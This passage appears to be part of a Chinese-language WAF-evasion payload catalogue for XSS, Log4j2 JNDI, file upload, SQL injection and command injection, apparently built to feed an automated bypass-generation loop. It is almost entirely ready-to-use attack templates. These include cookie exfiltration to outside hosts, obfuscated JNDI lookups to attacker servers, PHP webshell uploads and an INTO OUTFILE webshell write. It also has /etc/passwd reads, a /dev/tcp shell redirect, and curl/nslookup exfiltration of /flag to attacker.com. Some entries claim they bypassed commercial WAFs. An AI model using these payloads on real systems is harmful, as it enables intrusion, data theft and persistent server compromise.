- **风险**: 现代浏览器对 object/embed 中 JS 支持差异大（Chrome 走 data:，Firefox embed 走 javascript:）；需实测。
- **模板**:
  - `<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
  - `<embed src=javascript:alert(1)>`（Firefox）
  - `<embed/src=//evil.com/x.svg>`（斜杠分隔）
  - `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
  - `<object data=javascript:alert(1)>`
  - `<object data=x:x onerror=alert(1)>`
- **组合**: 与 data: URI 编码族。

### xss:context:srcdoc — iframe srcdoc 偷渡
- **原理**: `<iframe srcdoc>` 把 HTML 字符串当文档注入子 frame，默认同源可访问 parent DOM；WAF 若只拦 src 不拦 srcdoc 则漏。子 frame 脚本执行不受父页面内联 CSP 拦截。
- **风险**: sandbox 限制脚本时可组合 allow-scripts；需浏览器验证。
- **模板**:
  - `<iframe srcdoc="<script>alert(1)</script>">`
  - `<iframe srcdoc="<script>parent.alert(1)</script>">`（父 CSP 拦内联时子 frame 仍执行）
  - `<iframe srcdoc=<svg/onload=alert(1)>>`
- **组合**: 与 mxss 重解析。

### xss:context:meta_refresh — meta 刷新
- **原理**: `<meta http-equiv=refresh content>` 的 content 值可执行 javascript:，绕过只在普通标签上下文检测的 WAF。
- **模板**: `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
- **组合**: 与 url_proto 叠加。

### xss:context:css_injection — CSS 注入
- **原理**: CSS 上下文内 `expression()`（IE-only）或 `@import` 拉外部 CSS/JS；`@keyframes` + `onanimationstart` 组合自动触发执行。
- **风险**: `expression()` 仅 IE（现代浏览器无效）；`@import` 需后端存在 CSS 上下文；动画事件需现代浏览器。
- **模板**:
  - `<style>//*{x:expression(alert(/xss/))}//<style></style>`（IE）
  - `<div style="background:url(javascript:alert(1))">`（IE 部分版本）
  - `<style>@import url("//evil.com/x.css")</style>`
  - `<style>@keyframes x{}</style><div onanimationstart=alert(1) style=animation:x\ 1s>`
  - `<div ontransitionend=alert(1) style=transition:all\ 1s>`
- **组合**: 与 tag_bypass 动画事件族。

### xss:context:import_map — importmap/动态 import
- **原理**: `<script type=importmap>` 声明 data: 模块映射，`<script type=module>import "x"</script>` 加载执行；或动态 `import('data:text/javascript,alert(1)')` 走 ESM 绕过静态规则。
- **风险**: 需现代浏览器 ESM；importmap 支持较新（Chrome 89+）。
- **模板**:
  - `<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import "x"</script>`
  - `<script>import('data:text/javascript,alert(1)')</script>`
  - `<script>import(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>`
- **组合**: 与 data: URI 编码族。

## xss:semantic

### xss:semantic:dom_clobber — DOM clobbering
- **原理**: `<img name>`/`<form id>`/`<embed name>` 元素通过 id/name 生成全局引用，覆盖 `document.currentScript`/`window.x` 等属性，把无脚本 HTML 变成脚本加载 gadget（Webpack CVE-2024-43788、Vite CVE-2024-45812 同款）。
- **风险**: 依赖目标框架使用被 clobber 的全局（如 currentScript）；多为二次 gadget，需浏览器验证。
- **模板**:
  - `<img name="currentScript" src="https://attacker/evil.js">`（clobber document.currentScript）
  - `<form id=isDevelopment></form>`（truthy 全局覆盖开发检查）
  - `<img name=x src=1>` + 代码把 `window.x` 当脚本 URL 使用
- **组合**: 与 base_href 组合（CSP strict-dynamic 场景）。

### xss:semantic:polyglot — 多上下文 polyglot
- **原理**: 一条 payload 在 HTML 内容/属性/JS 字符串/URL/CSS 多上下文同时合法，WAF 单上下文正则无法整体匹配；`//`、注释、模板语法做上下文桥接。
- **风险**: 过长、易被现代语义引擎针对性检测；适合当"语义引擎识别的对抗基准"。
- **模板**:
  - `jaVasCript:/*-/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
  - `<svg/onload=javascript:alert(1)//`（无空格、`//` 注释吞尾）
  - `<svg/onload=/${//;{//alert(1)}//><Base/Href=//evil.com-->`（HTML+JS 注释+模板语法混用）
- **组合**: 冷门高级，WAF 语义引擎的重点对抗对象。

### xss:semantic:parser_differential — 解析器差异
- **原理**: WAF 与浏览器解析 HTML 的差异（命名空间、原始文本模式、标签容错）导致"WAF 看到无害 / 浏览器解析出 XSS"：`<svg><script>` 在 SVG 命名空间执行而 WAF 只拦顶层 `<script>`；`<scr<script>ipt>` 剥标签后重组；`<svg><use href=#x>` + `<defs><g id=x><script>` 延迟触发。
- **模板**:
  - `<svg><script>alert(1)</script></svg>`
  - `<scr<script>ipt>alert(1)</script>`、`<svg><script xlink:href="data:text/javascript,alert(1)"></script>`（2024 bug bounty 案例）
  - `<svg><use href="#x"/></svg><defs><g id="x"><script>alert(1)</script></g></defs>`
  - `<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>`
  - `<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:alert(1)">`（Chrome Android）
  - `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`（XML/SVG 命名空间）
- **组合**: 与 mxss 家族同源。

### xss:semantic:detection_rotation — 检测轮换阶梯
- **原理**: `alert(1)` 被 ~70% WAF 拦；从"弹窗"逐级轮换到"OOB 外带"，证明执行而不依赖 alert。成功判定不绑定 alert——这是"成功样本迭代"的判定基础。
- **模板**:
  - `alert(1)` → `prompt(1)` → `confirm(1)` → `print()`
  - `confirm(document.domain)`（带上下文）
  - `console.log('XSS-MARKER')`（无弹窗）
  - `document.title='XSS-MARKER'`（DOM 标记）
  - `window.xss_proof=Date.now()`（全局属性写）
  - `fetch('//oast.fun/?'+document.cookie)`、`new Image().src='//oast.fun/?c='+document.cookie`、`navigator.sendBeacon('//oast.fun/?'+document.cookie)`（OOB）
  - `location='//oast.fun/?'+document.cookie`
- **组合**: 与所有执行类原语；OOB 是成功样本判定主通道。

---

# log4j2

## log4j2:lookup

### log4j2:lookup:lower_upper — 大小写 lookup
- **原理**: `${lower:j}` 运行时产出 `j`，WAF 的 `jndi` 连续匹配被打断。
- **模板**:
  - `${${lower:j}ndi:${lower:l}dap://attacker/z}`
  - `${${upper:j}NDI:${upper:l}DAP://ATTACKER/z}`
  - `${j${lower:n}di:l${lower:d}ap://attacker/z}`
- **组合**: 嵌套 + env 组合。

### log4j2:lookup:empty_default — 空串默认值
- **原理**: `${::-j}` 展开为空串的默认值 `j`，逐字符拼出关键字。
- **模板**: `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker/z}`
- **组合**: 最常用混淆。

### log4j2:lookup:env_default — 环境变量默认值
- **原理**: `${env:NOTEXIST:-j}` 未存在变量取默认值 `j`。
- **模板**: `${jnd${env:EMPTY:-i}:ldap://attacker/z}`、`${${env:ENV:-j}ndi${env:ENV:-:}...}`
- **组合**: 与 empty_default 等效。

### log4j2:lookup:date_lookup — date 查表
- **原理**: `${date:'j'}` 日期格式字符拼接关键字。
- **模板**: `${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker/z}`
- **组合**: 冷门。

### log4j2:lookup:non_exist_lookup — 非存在 lookup
- **原理**: `${${what:ever:-j}...}`——Log4j 求值默认值而不管 lookup 是否存在。
- **模板**: `${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://attacker/z}`
- **组合**: 冷门。

### log4j2:lookup:ip_bracket — 方括号 IP
- **模板**: `${jndi:ldap://[192.168.34.96]/a}`、`${jndi:ldap:192.168.1.1:/a}`
- **组合**: 协议变体。

### log4j2:lookup:hash_fragment — # 绕过
- **原理**: `${jndi:ldap://127.0.0.1#attacker.com/z}`——URI.getHost() 取 # 前值，LDAP 连接全主机名（绕 2.15 部分检查）。
- **模板**: `${jndi:ldap://127.0.0.1#attacker.com/z}`
- **组合**: 冷门。

### log4j2:lookup:dotless_i — 无点 ı 归一化
- **原理**: U+0131（无点小写 ı）经 `${upper:ı}` → `I`，`jnd${upper:ı}` 运行时拼出 `jndi`。WAF 正则若只匹配 `jndi` 字面量则失手。
- **模板**: `${jnd${upper:ı}:ldap://attacker/z}`、`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`
- **组合**: 最有效的冷门 lookup 混淆之一。

### log4j2:lookup:sys_default — 系统属性默认值
- **原理**: `${sys:SYS_NAME:-i}` 系统属性不存在时取默认值 `i`，链式拼关键字。
- **模板**: `${jnd${sys:SYS_NAME:-i}:ldap://attacker/z}`、`${jnd${sys:LDAP:-i}:${sys:LDAP:-l}dap://attacker/z}`
- **组合**: 与 env_default 等效，WAF 可能只覆盖一种。

### log4j2:lookup:exotic_protocol — 冷门协议变体
- **原理**: JNDI 除 ldap 还支持 rmi/dns/iiop/java，WAF 黑名单常只含 ldap。
- **模板**: `${jndi:rmi://attacker/z}`、`${jndi:dns://attacker/z}`、`${jndi:iiop://attacker/z}`、`${jndi:ldaps://attacker/z}`
- **组合**: 与 lookup 混淆叠加。

### log4j2:lookup:info_disclosure — 非 JNDI 信息泄露 lookup
- **原理**: `bundle`/`java`/`sys`/`ctx`/`env` lookup 直接读敏感数据，WAF 对非 jndi 前缀覆盖弱。
- **模板**: `${bundle:application:spring.datasource.password}`、`${java:version}`、`${java:os}`、`${env:OS}`
- **组合**: 数据外带 / 信息泄露。

### log4j2:lookup:deep_nesting — 深嵌套递归
- **原理**: `substitute()` 无限递归，WAF 单层匹配在多层级嵌套下失手。
- **模板**: `${${lower:${upper:jn}}di:ldap://attacker/z}`、`${${lower:${upper:jn}}${::-di}:ldap://attacker/z}`、`${${::-${::-$${::-j}}}}`（递归层数）
- **组合**: 与所有 lookup 混淆叠加。

## log4j2:delivery（自然攻击面）

### log4j2:delivery:header_injection — 头注入
- **原理**: Log4j2 漏洞本质是服务器记录日志时解析 UA/Referer/X-Forwarded-For 等头中的 `${...}`。这些是标准攻击面（非协议层技巧）。
- **模板**: UA=`${jndi:ldap://attacker/z}`、Referer=`${${lower:j}ndi:...}`、XFF=`${jnd${upper:ı}:ldap://attacker/z}`
- **组合**: 与 lookup 混淆叠加。

---

# upload

## upload:extension

### upload:extension:multi_extension — 多级扩展名
- **模板**: `shell.php.jpg`、`shell.php.png`、`x.php.html`
- **组合**: 需后端 Apache 多级处理（.php.jpg 不执行，仅测 WAF 是否拦后缀特征）。

### upload:extension:double_extension — 双扩展名
- **模板**: `shell.php.php`、`shell.phtml.php`
- **组合**: 绕过只查尾部扩展名的规则。

### upload:extension:case_ext — 大小写扩展名
- **模板**: `shell.PHP`、`shell.Php`、`shell.pHp5`
- **组合**: 绕大小写敏感黑名单。

### upload:extension:trailing_dot — 尾点/尾空格
- **模板**: `shell.php.`、`shell.php `、`shell.php%00`（历史）
- **组合**: 绕精确匹配。

## upload:config

### upload:config:htaccess — .htaccess
- **原理**: 上传 `.htaccess` 改变目录解析：`AddType application/x-httpd-php .jpg`。
- **模板**: 文件内容 `AddType application/x-httpd-php .jpg` 或 `SetHandler application/x-httpd-php`
- **组合**: 内容层。

### upload:config:user_ini — user.ini
- **原理**: `user.ini` 的 `auto_prepend_file` 让每个 PHP 文件前置包含。
- **模板**: `auto_prepend_file=shell.jpg`
- **组合**: 内容层。

## upload:content

### upload:content:short_tag — PHP 短标签
- **原理**: `<?=` 是 PHP 5.4+ 永久特性，3 字符；`<?` 依赖 short_open_tag。
- **模板**: 内容 `<?=system('cat /etc/passwd');?>`
- **组合**: 最小可执行内容。

### upload:content:dynamic_function — 动态函数
- **模板**: `<?php $f='sys'.'tem';$f('id');?>`
- **组合**: 绕函数名特征。

### upload:content:magic_bytes — 魔术字节 polyglot
- **模板**: 内容 `GIF89a` + `<?=...?>`（图片马）
- **组合**: 绕 MIME/头检测。

## upload:filename

### upload:filename:filename_star — filename* 参数
- **原理**: RFC 5987 `filename*` 编码文件名，部分解析器与 WAF 处理不一致。
- **模板**: `filename*="UTF-8''shell.php"`
- **组合**: 协议层。

### upload:filename:crlf_filename — CRLF/控制字符文件名
- **模板**: `shell.php%0a`、`shell.php\r\n`、`shell.php\x00.jpg`
- **组合**: 绕字符串精确匹配。

---

# XSS 同义近义词表（成功样本迭代用）

> 用途：一条成功样本的某 token 被 WAF 拦时，沿同义链替换派生新样本。
> 判定标准是"请求能否过 WAF"，不是"弹不弹窗"——所以检测载荷本身也要做同义轮换（见 xss:semantic:detection_rotation）。

## 1. 执行函数同义（alert 被拦时）
- `alert(1)` → `confirm(1)` → `prompt(1)` → `print()`（基本轮换）
- `top.alert(1)` / `self.alert(1)` / `window.alert(1)` / `globalThis.alert(1)`
- `[].constructor.constructor('alert(1)')()`、`Function('alert(1)')()`
- `top['al'+'ert'](1)`、`top[/al/.source+/ert/.source](1)`
- `window[atob('YWxlcnQ=')](1)`、`window[String.fromCharCode(97,108,101,114,116)](1)`、`top[8680439..toString(30)](1)`
- `` alert`1` ``、`` setTimeout`alert\x281\x29` ``
- `onerror=alert;throw 1`、`[7].map(alert)`、`alert.bind()(1)`、`alert?.(1)`

## 2. 事件处理器同义链
`onerror` → `onload` → `onfocus` → `onmouseover` → `onpointerenter` → `ontoggle` → `onauxclick` → `onclick` → `onscroll` → `onstart` → `onmouseenter` → `ontouchstart`
- 扩展池：`onpageshow` / `onresize` / `onbeforetoggle` / `onbeforematch` / `onclose` / `onplaying` / `onbegin` / `onanimationstart` / `ontransitionend` / `onblur` / `onchange` / `oninput` / `onsubmit` / `oninvalid` / `ondblclick` / `oncontextmenu` / `onwheel` / `onpointerdown` / `onpointerover` / `ondrag` / `ondrop` / `oncopy` / `onpaste` / `onvolumechange` / `onseeked`

## 3. 标签同义链
`img` → `svg` → `video` → `iframe` → `details` → `input` → `body` → `marquee` → `math` → `noscript` → `template` → `a` → `form`
- 扩展池：`audio` / `object` / `embed` / `keygen` / `select` / `textarea` / `button` / `dialog` / `isindex` / `xmp` / `plaintext` / `table` / `style` / `link` / `base` / `meta` / `circle` / `rect`

## 4. `javascript:` 协议同义变体
- `JaVaScRiPt:`（大小写）、`java\tscript:`、`java\nscript:`、`java%0ascript:`、`java%09script:`
- `j&#x61;vasc&#x72;ipt&#x3a:`（实体）、`javascript:\u0061lert(1)`（Unicode 转义）、`javascript://%250Aalert(1)//`
- `data:text/html,<script>...`、`data:text/html;base64,<b64>`、`data:text/javascript,`
- `vbscript:`（IE）、`livescript:`/`mocha:`/`jar:`（旧浏览器）、`blob:`（动态 import）、协议相对 `//`

## 5. `=` 省略 / 空白变体
- 无引号：`<img src=x onerror=alert(1)>`
- 无空格：`<svg/onload=alert(1)>`（斜杠分隔）
- 无闭合 `>`：`<img src=x onerror=alert(1)`、`<svg/onload=alert(1)`
- 全斜杠分隔：`<img/src=x/onerror=alert(1)>`
- 空白替代：`%09` / `%0a` / `%0d` / `%a0` / `/` 替代空格
- 无引号 + `//` 吞尾：`" autofocus onfocus=alert(1)//`
- 混合大小写 + 空字节：`<Img/Src/OnError=(alert)(1)>`

## 6. `alert(1)` 的 JS 等价
- `eval(atob('YWxlcnQoMSk='))`
- `String.fromCharCode(97,108,101,114,116,40,49,41)`
- `top['al'+'ert'](1)`
- `Function('alert(1)')()`、`[]['constructor']['constructor']('alert(1)')()`
- `prompt`、`confirm`
- `` alert`1` ``（标签模板）、`onerror=alert;throw 1`
- `/al/.source+/ert/.source`、`8680439..toString(30)`
- `alert.bind()(1)`、`alert?.(1)`、`[7].map(alert)`

---

# ⛔ 协议层（范围外）

> **2026-08-03 用户明确：本 skill 不做协议层。** chunked 传输、HPP 参数污染、
> JSON body / multipart 内容类型走私、路径归一化、控制字符等**传输层手段一律不做**。
> 如需这些维度，属未来协议层 skill / encoding skill 范畴。
> 本 skill 只做**内容层**：词法 / 语法 / 语义表达变换，注入位限 query / path /
> 自然 HTTP 头（UA/Referer/XFF 属 Log4j2 标准攻击面，不算协议层）。

---

# 组合建议（跨场景移植）

- CMDi 引号拆分 `c'a't` → SQLi `UN'ION'` → XSS `on'er'ror'`（已验证有效的词法技术在别的场景常有意料之外效果）
- `version_comment` + `operator_swap` + `null_replacement` → 全无关键字 UNION
- `whitespace_sub`（%a0）几乎是所有 SQLi 词法原语的地基
- Log4j 各 lookup 原语可互相嵌套（4.4.5 组合）
- 学习循环的 confirmed 技法优先做"深度（更多变体）+ 跨层（叠加其他层）"双轴展开

---

# 检索扩充（2026-08 四路合并）

> 2026-08 联网检索 SQLi/CMDi/Log4j2/Upload 高级与冷门技法，按原语 id 并入。
> 是否对当前 WAF 有效仍由学习循环实测判定。

## sqli 扩充

### sqli:lexical:ascii_whitespace — ASCII 空白全集
- **原理**: MySQL 词法器只认 ASCII 空白（0x09-0x0D、0x20）。`%0b`/`%0c` 对 WAF 与 MySQL 都成立；`%a0`(U+00A0) **不是** MySQL 合法空白，只能骗 WAF 正则——可靠性低于 `%0b/%0c`。
- **模板**: `1 union%0bselect 1,2`、`1%0aunion%0cselect%0d1,2%23`

### sqli:lexical:version_comment_nested — 版本注释嵌套
- **模板**: `-1' union/*/!*!/*/select%201,2,3--+`、`/*!00000SEL*/`（全版本执行）

### sqli:lexical:comment_termination — 注释行终止
- **模板**: `id=1 union#a%0aselect 1,2,3#`、`id=1 xor sleep%2d%2d%0a(5)`。注意 `--` 裸用不生效（MySQL 要求尾字符），`#` 无此要求。

### sqli:lexical:after_operator_chars — AND/OR 后无空格符号
- **模板**: `1 OR+1=1`、`1 AND-1=-1`、`1 OR~1`、`1 AND!0`

### sqli:lexical:number_boundary — 数字字面量消除空格
- **模板**: `161444.0Union(select-1.0,2,3,4,version())`、`select-1.0`、`select~1`

### sqli:syntactic:func_call_form — 函数调用形态 UNION(SELECT)
- **模板**: `1 UNION(SELECT 1,(SELECT flag FROM flags),3)`、`(SELECT(username)FROM(users))`

### sqli:syntactic:join_derived — JOIN/派生表替代 UNION 与逗号
- **模板**: `union select * from (select 1)a join (select 2)b`（无列名探测）、`1 UNION (SELECT * FROM (SELECT 1,2,3)x)`

### sqli:syntactic:cte_with — WITH ... AS（MySQL 8.0+）
- **模板**: `-1 UNION (WITH cte AS (SELECT flag FROM flags) SELECT * FROM cte)`、递归 CTE heavy query 延时

### sqli:syntactic:values_row — VALUES ROW()（8.0.19+）
- **模板**: `id=-1 union values row(1,2,3)`（字面不匹配 `UNION SELECT`）、`id=-1 union (values row(1,(select flag from flags),3))`

### sqli:syntactic:clause_escape — 非 WHERE 上下文盲注
- **模板**: `ORDER BY (CASE WHEN (1=1) THEN 1 ELSE 2 END)`、`HAVING 1=1`、`LIMIT (SELECT 1)`

### sqli:syntactic:no_column_name — 无列名注入
- **模板**: `` select `3` from (select 1,2,3 union select * from users)a ``、`select b from (select 1 as a,2 as b union select * from xxx)n`

### sqli:semantic:geo_error — ST_* 空间函数报错
- **模板**: `and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+`、`ST_PointFromGeoHash(...)`

### sqli:semantic:geometry_error — GeometryCollection（5.1~5.5.48 版本边界）
- **模板**: `and GeometryCollection((select * from(select * from(select user())a)b))`

### sqli:semantic:gtid_subtract — GTID 家族补充
- **模板**: `') or gtid_subtract(concat(0x7e,(select group_concat(user,':',password) from manage),0x7e),1)--+`

### sqli:semantic:double_query — 双查询报错
- **模板**: `1 and (select 1 from (select count(*),concat((select flag from flags),floor(rand(0)*2)) as a from information_schema.schemata group by a) as y)`、`1 and exp(~(select * from (select user())a))`

### sqli:syntactic:time_alt — SLEEP 替代四件套
- **模板**: `and if(..., benchmark(5000000, md5('a')), 1)`、`get_lock('a',5)`、正则回溯 `RLIKE '(a.*)+'`、笛卡尔 heavy query

### sqli:syntactic:bool_ops — 布尔算子替代 =
- **模板**: `id=1 and (select database()) regexp binary '^se'`、`1 in (1)`、`1 between 0 and 2`、`'a' sounds like 'a'`、`soundex('a')=soundex('a')`

### sqli:syntactic:true_expr — 1=1 等价表达式库
- **模板**: `1 LIKE 1`/`1 REGEXP 1`/`1 RLIKE 1`/`2-1=1`/`1 IN(1)`/`1 BETWEEN 0 AND 2`/`0x01=0x01`/`~0`/`!0`；恒假对照 `mod(29,9)`/`0&1`

### sqli:semantic:prepared_hex — HEX 化 SET/PREPARE/EXECUTE
- **模板**: `;SET @t=0x53454c454354202a2066726f6d20666c616773;PREPARE s FROM @t;EXECUTE s;-- -`（需堆叠查询）

### sqli:semantic:into_outfile — OUTFILE/DUMPFILE 写文件
- **模板**: `-1 union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\\WWW\\shell.php'--+`（需 FILE 权限）

### sqli:lexical:backtick_ident — 反引号标识符
- **模板**: `` select `flag` from `flags`; ``、`` select(`version`()); ``

### sqli:lexical:dot_space — 点周围空白/引号
- **模板**: `information_schema . tables`、`` `information_schema` . `tables` ``

### ⚠️ 修正（检索发现）
- `SEL/**/ECT` 拆单个 token 在现代 MySQL **失效**（注释只能在 token 间）——旧 `comment_split` 模板需实测标注
- `%a0` 不是 MySQL 合法空白（见 ascii_whitespace）

## cmdi 扩充

### cmdi:lexical:empty_special_param — $@/$* 空参数拆分
- **模板**: `c$@at /etc/passwd`、`who$@ami`、`l$@s -la`（POSIX，dash 可用）

### cmdi:lexical:default_value_split — ${x:-c} 默认值
- **模板**: `${x:-c}${x:-a}${x:-t} /etc/passwd`、`c${x:-a}t /etc/passwd`（POSIX）

### cmdi:lexical:empty_cmd_subst — 空命令替换
- **模板**: `wh$()oami`、`c``at /etc/passwd`（POSIX）

### cmdi:lexical:octal_ansi — ANSI-C 八进制
- **模板**: `$'\143\141\164' /etc/passwd`、`cat$'\40'/etc/passwd`（bash-only）

### cmdi:lexical:redir_space — 重定向替代空格
- **模板**: `cat</etc/passwd`、`cat<>/etc/passwd`、`sh</dev/tcp/127.0.0.1/4242`（POSIX）

### cmdi:lexical:ifs_variants — IFS 变体
- **模板**: `cat$IFS$9/etc/passwd`、`ls${IFS%??}-la`、`cat$'\t'/etc/passwd`

### cmdi:syntactic:glob_char_class — 字符类 [w]
- **模板**: `cat /etc/pass[w]d`、`cat /[e]tc/passwd`（已实测绕阿里云全规则/Azure OWASP）

### cmdi:syntactic:glob_full_command — 命令全路径 glob
- **模板**: `/???/??t /???/??ss??`（`/bin/cat /etc/passwd`）、`/?b?n/c?t /etc/passwd`

### cmdi:syntactic:path_variants — 路径归一化
- **模板**: `cat /etc/./passwd`、`cat /etc//passwd`、`cat /etc/../etc/passwd`

### cmdi:syntactic:cmd_alt_read — 读文件命令替代
- **模板**: `tac /etc/passwd`、`grep '' /etc/passwd`、`nl /etc/passwd`、`sort /etc/passwd`、`od -An -c /etc/passwd`、`xxd /etc/passwd`、`dd if=/etc/passwd bs=1 count=1000 2>/dev/null`、`base64 /etc/passwd`、`curl file:///etc/passwd`

### cmdi:syntactic:builtin_force — 内置/命令查找
- **模板**: `command -v cat`、`type -P cat`、`$0 -c id`、`${0##-} -c 'cat /etc/passwd'`

### cmdi:syntactic:interp_read — 语言解释器读文件
- **模板**: `python3 -c "print(open('/etc/passwd').read())"`、`perl -F: -lane 'print $F[0]' /etc/passwd`、`php -r "echo file_get_contents('/etc/passwd');"`、`node -e "console.log(require('fs').readFileSync('/etc/passwd','utf8'))"`

### cmdi:syntactic:heredoc_feed — heredoc/here-string
- **模板**: `sh<<<'cat /etc/passwd'`、`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`（`<<<` bash-only）

### cmdi:syntactic:separator_rotate — 分隔符轮换
- **模板**: `%0awhoami`、`false||cat /etc/passwd`（恒失败必执行）、`true&&cat /etc/passwd`

### cmdi:syntactic:comment_noise — 注释噪声
- **模板**: `;cat /etc/passwd #faketoken=1`、`cat /etc/passwd |# noise noise noise`（稀释评分）

### cmdi:semantic:env_char_extract — 环境变量字符构造
- **模板**: `${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd`（bash-only 子串）

### cmdi:semantic:env_assign_cmd — 变量赋值再执行
- **模板**: `e=cat;$e /etc/passwd`、`;x=cat&&$x$IFS/etc/passwd`（POSIX）

### cmdi:semantic:env_export_inject — env/export 注入
- **模板**: `env PATH=/tmp:$PATH ls`（PATH 投毒）、`BASH_ENV=/tmp/x bash`

### cmdi:semantic:printf_write — printf/echo 写文件
- **模板**: `printf '<?php system($_GET[c]); ?>' > /tmp/x.php`（`$` 需 `\$`）、`tee /tmp/x < /etc/passwd`

### cmdi:semantic:decode_exec — 解码后执行
- **模板**: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`、`echo 77686f616d69 | xxd -r -p | bash`、`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`

### cmdi:semantic:oob_http / oob_dns — 外带
- **模板**: `;curl http://attacker.com/$(cat /flag)`、`;nslookup $(cat /flag|base64|tr -d '\n').attacker.com`、`;ping -c1 $(cat /flag|base64).attacker.com`

### cmdi:portability — bash vs dash
- **⚠️** dash（Debian `/bin/sh`）不支持：`${var:0:1}` 子串、`$'...'` ANSI-C、`<<<`、`<( )`、`{a,b}` brace、`${a,,}`、数组。**brace_expansion/ansi_c_quoting/parameter_expansion 在 dash 下失效**——生成时若后端是 dash 需剔除

## log4j2 扩充

### log4j2:leak:* — 非 JNDI 信息泄露 lookup（WAF 常漏，已实测 bundle 通过）
- **模板**: `${bundle:application:spring.datasource.password}`、`${java:version}`、`${java:os}`、`${sys:user.home}`、`${env:OS}`、`${hostName}`、`${ctx:loginId}`、`${main:0}`、`${web:rootDir}`、`${docker:containerId}`、`${k8s:podName}`、`${log4j:configLocation}`、`${sd:id:name}`

### log4j2:lookup:dotless_i — 无点 ı
- **模板**: `${jnd${upper:ı}:ldap://attacker/z}`（已实测被拦，但 UA 头非 ASCII 需原始 UTF-8 发送）

### log4j2:lookup:sys_default — 系统属性默认值
- **模板**: `${jnd${sys:SYS_NAME:-i}:ldap://attacker/z}`

### log4j2:proto:* — 冷门协议
- **模板**: `${jndi:rmi://attacker:1099/obj}`、`${jndi:dns://attacker}`、`${jndi:iiop://attacker:1050/obj}`、`${jndi:ldaps://attacker:636/obj}`、`${jndi:ldap://127.0.0.1#attacker.com:1389/a}`（# 片段）、`${jndi:ldap:127.0.0.1:1389/a}`（无 //）

### log4j2:hist:45046 / 45105 — 版本绕过史
- **模板**: `$${ctx:loginId}`（pattern 侧重开消息 lookup）、`${jndi:ldap://127.0.0.1:9999/ test}`（空格绕过 2.15）、多层递归 `$${::-$${::-j}}`（2.16 仍 DoS）

## upload 扩充

### upload:ext:alt-php / double / trailing / case — 扩展名变体
- **模板**: `shell.phtml`/`x.phar`/`cmd.php5`、`shell.php.jpg`、`shell.php.`/`shell.php%20`、`shell.pHp`、`shell.asp;.jpg`（IIS）、`x.asa`/`x.cer`/`x.jspx`/`1.陪sp`（GhostBits）

### upload:content:scriptlang / dynamic-func / base64-eval / xor-chars
- **模板**: `<script language=php>system($_GET['c']);</script>`、`$f='sys'.'tem';$f($_GET['c']);`、`$f=strrev('metsys');$f($_GET['c']);`、`$x=base64_decode("...");eval($x);`、`$f=~urldecode('%9E%8C%8C%9A%93%9E');$f($_GET['c']);`

### upload:content:htaccess-addtype / sethandler / user-ini / webconfig
- **模板**: `.htaccess`=`AddType application/x-httpd-php .jpg`、`SetHandler application/x-httpd-php`、`.user.ini`=`auto_prepend_file=2.png`+图片马、`web.config` handler 映射

### upload:mime:filename-star / boundary-confusion / multipart-split
- **模板**: `filename="safe.txt"; filename*=utf-8''evil.php`、`boundary =----...`、`filename="1.jpg";filename="shell.php"`、`filename="shell.php`（引号不闭合）

### upload:race:* / secondorder:*
- **模板**: Tomcat CVE-2024-50379 并发 PUT/GET、`.user.ini` 二次上传、日志投毒 + include、`<%=Runtime.getRuntime().exec(...)%>`（JSPX）
